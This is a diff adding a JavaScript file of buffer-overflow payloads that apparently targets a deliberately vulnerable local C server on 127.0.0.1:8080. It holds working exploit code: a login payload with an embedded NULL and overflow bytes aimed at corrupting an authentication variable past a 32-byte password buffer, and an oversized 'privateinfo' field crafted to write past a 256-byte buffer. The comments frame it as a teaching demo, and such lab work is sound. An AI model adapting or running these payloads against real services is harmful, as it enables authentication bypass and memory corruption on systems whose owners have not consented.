@@ -1,0 +1,92 @@
+// ============================================================
+// Buffer Overflow Demo Payloads
+// ============================================================
+
+// Helper: send an exact byte payload without UTF-8 converting
+// arbitrary byte values.
+async function sendBytes(url, bytes) {
+    return fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: bytes
+    }).then(response => response.text())
+.then(html => {
+    document.open();
+    document.write(html);
+    document.close();
+});
+}
+
+
+// ============================================================
+// EXPLOIT / DEMO 1
+// Password-buffer overflow demonstration
+//
+// Server-side layout:
+//
+//     passwordcstr[32]
+//     k
+//
+// The payload contains an embedded NULL followed by additional
+// bytes. Uint8Array is used so the bytes are transmitted literally.
+// ============================================================
+
+const passwordPrefix =
+    "username=admin&password=" +
+    "x\0" +
+    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+
+const passwordText = new TextEncoder().encode(passwordPrefix);
+
+// Four additional bytes for observing corruption in the
+// deliberately vulnerable local demo.
+const passwordOverflow = new Uint8Array([
+    0xE0,
+    0xFF,
+    0xFF,
+    0xFF
+]);
+
+const passwordPayload = new Uint8Array(
+    passwordText.length + passwordOverflow.length
+);
+
+passwordPayload.set(passwordText);
+passwordPayload.set(passwordOverflow, passwordText.length);
+
+sendBytes(
+    "http://127.0.0.1:8080/login",
+    passwordPayload
+);
+
+
+// ============================================================
+// EXPLOIT / DEMO 2
+// privateinfo out-of-bounds-write demonstration
+//
+// Server-side:
+//
+//     char privateinfo[256];
+//
+// The payload deliberately exceeds that boundary so that the
+// debugger / AddressSanitizer can demonstrate the invalid write.
+// ============================================================
+
+const privateInfo =
+    "13412\0" +
+    "341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234" +
+    "hacked\0" +
+    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx123\0" +
+    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+
+const privateInfoBytes = new TextEncoder().encode(
+    "privateinfo=" + privateInfo +
+    "&username=hacker&password=123"
+);
+
+sendBytes(
+    "http://127.0.0.1:8080/updateinfo",
+    privateInfoBytes
+);
